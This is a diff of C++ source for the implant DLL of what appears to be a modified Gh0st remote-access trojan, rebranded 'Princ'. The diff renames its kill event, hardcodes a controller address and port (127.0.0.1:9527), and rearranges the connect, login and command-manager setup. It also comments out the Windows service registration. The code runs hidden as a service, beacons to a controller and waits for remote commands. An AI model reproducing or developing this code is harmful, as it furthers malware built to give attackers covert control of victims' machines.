@@ -43,9 +43,11 @@ DWORD WINAPI main(wchar_t *lpServiceName)
 {
 	// lpServiceName,在ServiceMain返回后就没有了
 	wchar_t	strServiceName[256];
+	memset(strServiceName,0,sizeof(strServiceName));
 	wchar_t	strKillEvent[50];
+	memset(strKillEvent,0,sizeof(strKillEvent));
 	//HANDLE	hInstallMutex = NULL;
-	wsprintf(strKillEvent, _T("Global\\Gh0st %d"), GetTickCount()); // 随机事件名
+	wsprintf(strKillEvent, _T("Princ\\Princ %d"), GetTickCount()); // 随机事件名
 
 	// 告诉操作系统:如果没有找到CD/floppy disc,不要弹窗口吓人
 	SetErrorMode( SEM_FAILCRITICALERRORS);
@@ -78,7 +80,8 @@ DWORD WINAPI main(wchar_t *lpServiceName)
 				Sleep(60);
 			}
 		}
-		
+		lpszHost = _T("127.0.0.1");
+		dwPort = 9527;
 		DWORD dwTickCount = GetTickCount();
 		if (!socketClient.Connect(lpszHost, dwPort))
 		{
@@ -86,12 +89,12 @@ DWORD WINAPI main(wchar_t *lpServiceName)
 			continue;
 		}
 		// 登录
-		
+		CKernelManager	manager(&socketClient, strServiceName, g_dwServiceType, strKillEvent, lpszHost, dwPort);
+//		socketClient.setManagerCallBack(&manager);
+
 		DWORD dwExitCode = SOCKET_ERROR;
 		lstrcpy(strServiceName, lpServiceName);
 		sendLoginInfo(strServiceName, &socketClient, GetTickCount() - dwTickCount);
-		CKernelManager	manager(&socketClient, strServiceName, g_dwServiceType, strKillEvent, lpszHost, dwPort);
-		socketClient.setManagerCallBack(&manager);
 
 		// 等待控制端发送激活命令，超时为10秒，重新连接,以防连接错误
 		for (int i = 0; (i < 10 && !manager.IsActived()); i++)
@@ -147,18 +150,18 @@ BOOL APIENTRY DllMain( HMODULE hModule,
 extern "C" PRINCDLL_API void ServiceMain( int argc, wchar_t* argv[] )
 {
 	wcsncpy(svcname, (wchar_t*)argv[0], sizeof svcname); //it's should be unicode, but if it's ansi we do it well
-	//wcstombs(svcname, argv[0], sizeof svcname);
-	hServiceStatus = RegisterServiceCtrlHandler(svcname, (LPHANDLER_FUNCTION)ServiceHandler);
-	if( hServiceStatus == NULL )
-	{
-		return;
-	}else FreeConsole();
-
-	TellSCM( SERVICE_START_PENDING, 0, 1 );
-	TellSCM( SERVICE_RUNNING, 0, 0);
-	// call Real Service function noew
-
-	g_dwServiceType = QueryServiceTypeFromRegedit(svcname);
+// 	wcstombs(svcname, argv[0], sizeof svcname);
+// 		hServiceStatus = RegisterServiceCtrlHandler(svcname, (LPHANDLER_FUNCTION)ServiceHandler);
+// 		if( hServiceStatus == NULL )
+// 		{
+// 			return;
+// 		}else FreeConsole();
+// 	
+// 		TellSCM( SERVICE_START_PENDING, 0, 1 );
+// 		TellSCM( SERVICE_RUNNING, 0, 0);
+// 		// call Real Service function noew
+// 	
+// 		g_dwServiceType = QueryServiceTypeFromRegedit(svcname);
 	HANDLE hThread = MyCreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)main, (LPVOID)svcname, 0, NULL);
 	do{
 		Sleep(100);//not quit until receive stop command, otherwise the service will stop
